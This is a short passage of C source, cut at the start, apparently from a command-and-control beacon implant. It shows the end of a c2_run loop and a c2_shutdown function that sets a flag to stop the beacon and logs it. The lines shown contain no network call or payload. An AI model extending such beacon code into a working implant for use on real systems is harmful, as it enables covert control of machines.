    c2_log("c2_run: loop exited");
}

/*
 * c2_shutdown
 * Signal the beacon loop to exit on the next iteration.
 * Safe to call from any thread.
 */
void c2_shutdown(void) {
    g_c2.shutdown = TRUE;
    c2_log("c2_shutdown: signalled");
}